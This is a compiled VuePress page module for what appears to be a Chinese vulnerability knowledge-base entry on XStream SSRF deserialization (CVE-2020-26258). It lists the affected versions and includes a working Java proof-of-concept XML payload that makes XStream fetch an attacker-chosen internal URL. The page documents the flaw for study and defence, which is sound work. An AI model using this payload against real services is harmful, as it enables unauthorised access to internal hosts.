import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as s,c as l,a as e,b as n,d as r,e as d}from"./app-58e4a7d6.js";const o={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),c=e("p",null,"Xstream 是 Java 类库，用来将对象序列化成 XML (JSON) 或反序列化为对象。XStream 是一款开源软件，允许在 BSD 许可证的许可下分发。",-1),v=e("p",null,"参考链接：",-1),m={href:"https://raw.githubusercontent.com/jas502n/CVE-2020-26259/main/CVE_2020_26258.java",target:"_blank",rel:"noopener noreferrer"},b=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Xstream &lt; = 1.4.14
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>修复版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Xstream &lt; = 1.4.15
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import com.thoughtworks.xstream.XStream;

/*
CVE-2020-26258: A Server-Side Forgery Request can be activated unmarshalling
with XStream to access data streams from an arbitrary URL referencing a resource in an intranet or the local host.
All versions until and including version 1.4.14
https://x-stream.github.io/CVE-2020-26258.html
Security framework of XStream not explicitly initialized, using predefined black list on your own risk.
*/

public class CVE_2020_26258 {
    public static void main(String[] args) {
        String ssrf_xml = &quot;&lt;map&gt;\\n&quot; +
                &quot;  &lt;entry&gt;\\n&quot; +
                &quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\\n&quot; +
                &quot;      &lt;flags&gt;0&lt;/flags&gt;\\n&quot; +
                &quot;      &lt;value class=&#39;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#39;&gt;\\n&quot; +
                &quot;        &lt;dataHandler&gt;\\n&quot; +
                &quot;          &lt;dataSource class=&#39;javax.activation.URLDataSource&#39;&gt;\\n&quot; +
                &quot;            &lt;url&gt;http://localhost:8989/internal/:&lt;/url&gt;\\n&quot; +
                &quot;          &lt;/dataSource&gt;\\n&quot; +
                &quot;          &lt;transferFlavors/&gt;\\n&quot; +
                &quot;        &lt;/dataHandler&gt;\\n&quot; +
                &quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\\n&quot; +
                &quot;      &lt;/value&gt;\\n&quot; +
                &quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\\n&quot; +
                &quot;    &lt;string&gt;test&lt;/string&gt;\\n&quot; +
                &quot;  &lt;/entry&gt;\\n&quot; +
                &quot;&lt;/map&gt;&quot;;
        XStream xstream = new XStream();
        xstream.fromXML(ssrf_xml);
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,8);function g(h,_){const t=i("ExternalLinkIcon");return s(),l("div",null,[u,c,v,e("ul",null,[e("li",null,[e("a",m,[n("https://raw.githubusercontent.com/jas502n/CVE-2020-26259/main/CVE_2020_26258.java"),r(t)])])]),b])}const x=a(o,[["render",g],["__file","XStream SSRF 反序列化漏洞 CVE-2020-26258.html.vue"]]);export{x as default};
